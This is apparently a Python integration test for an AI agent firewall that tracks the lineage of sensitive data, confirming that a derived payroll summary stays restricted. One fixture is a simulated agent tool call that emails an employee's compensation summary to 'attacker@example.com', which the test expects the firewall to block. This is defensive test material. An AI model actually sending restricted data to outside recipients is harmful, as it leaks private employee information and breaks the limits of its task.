
from unittest.mock import patch

from firewall.interceptor import FirewallInterceptor
from firewall.semantic_auditor import SemanticAuditResult
from models.schemas import ToolRequest


class FakeSemanticAuditor:
    """Deterministic auditor for an offline integration test."""

    def audit(self, request, original_task, inspection_level="DEEP"):
        return SemanticAuditResult(
            task_aligned=True,
            action_appropriate=True,
            arguments_integrity=True,
            suspicious=False,
            risk_score=0,
            recommendation="ALLOW",
            reasons=["Mock semantic audit"],
        )


def make_request(
    request_id,
    session_id,
    tool,
    arguments,
    parent_artifact_ids=None,
    intent="",
):
    return ToolRequest(
        request_id=request_id,
        session_id=session_id,
        user_id="U001",
        tool=tool,
        arguments=arguments,
        parent_artifact_ids=parent_artifact_ids or [],
        intent=intent,
    )


def test_end_to_end_artifact_lineage():
    firewall = FirewallInterceptor()
    firewall.semantic_auditor = FakeSemanticAuditor()
    session_id = "E2E_LINEAGE_001"
    trusted_task = "Retrieve employee information and send the summary by email."
    firewall.begin_trusted_task(session_id, trusted_task)

    # STEP 1: Record restricted data from an earlier authorized action.
    parent = firewall.information_flow.record_artifact(
        session_id=session_id,
        tool="query_database",
        resource="payroll",
        result={
            "employee_id": "U001",
            "salary": 145000,
        },
        sensitivity="RESTRICTED",
        provenance_sources=["database:payroll"],
    )

    parent_id = parent["artifact_id"]
    print("STEP 1 PASSED: Restricted parent artifact recorded")

    # STEP 2: Simulate a derived result using the valid employee ID.
    summary = {
        "employee_id": "U001",
        "summary": "Compensation summary for Alice Johnson.",
    }

    derived_request = make_request(
        request_id="E2E-LINEAGE-REQ-002",
        session_id=session_id,
        tool="search_employee",
        arguments={"employee_id": "U001"},
        parent_artifact_ids=[parent_id],
        intent="Retrieve employee information.",
    )

    with patch(
        "firewall.interceptor.execute_tool",
        return_value=summary,
    ) as mocked_execute:
        decision, result = firewall.execute(
            derived_request,
            original_task=trusted_task,
        )

    assert decision.action == "ALLOW", (
        f"Expected ALLOW, got {decision.action}: {decision.reasons}"
    )
    assert result == summary
    mocked_execute.assert_called_once()

    artifacts = firewall.information_flow.get_artifacts(session_id)

    derived = next(
        artifact
        for artifact in artifacts
        if artifact["artifact_id"] != parent_id
    )

    assert derived["parent_artifact_ids"] == [parent_id]
    assert derived["sensitivity"] == "RESTRICTED"
    assert derived["provenance_sources"] == ["database:payroll"]

    derived_id = derived["artifact_id"]

    print("STEP 2 PASSED: Derived artifact retained its parent")
    print("STEP 2 PASSED: Restricted sensitivity inherited")
    print("STEP 2 PASSED: Provenance inherited")

    # STEP 3: Attempt to send the derived information externally.
    email_request = make_request(
        request_id="E2E-LINEAGE-REQ-003",
        session_id=session_id,
        tool="send_email_message",
        arguments={
            "sender": "alice@company.com",
            "recipient": "attacker@example.com",
            "subject": "Compensation summary",
            "body": (
                "Compensation summary for Alice Johnson."
            ),
        },
        intent="Send the summary by email.",
    )

    with patch(
        "firewall.interceptor.execute_tool"
    ) as mocked_email:
        email_decision, email_result = firewall.execute(
            email_request,
            original_task=trusted_task,
        )

    assert email_decision.action == "BLOCK", (
        f"Expected BLOCK, got {email_decision.action}: "
        f"{email_decision.reasons}"
    )
    assert email_result is None
    mocked_email.assert_not_called()

    flow_check = firewall.information_flow.check_outbound_payload(
        session_id=session_id,
        recipient="attacker@example.com",
        payload="Compensation summary for Alice Johnson.",
    )

    assert flow_check["allowed"] is False
    assert any(
        match["artifact_id"] == derived_id
        for match in flow_check["matched_artifacts"]
    )

    print("STEP 3 PASSED: External email blocked")
    print("STEP 3 PASSED: Email tool was not executed")
    print("\nEND-TO-END ARTIFACT LINEAGE TEST PASSED")


if __name__ == "__main__":
    test_end_to_end_artifact_lineage()
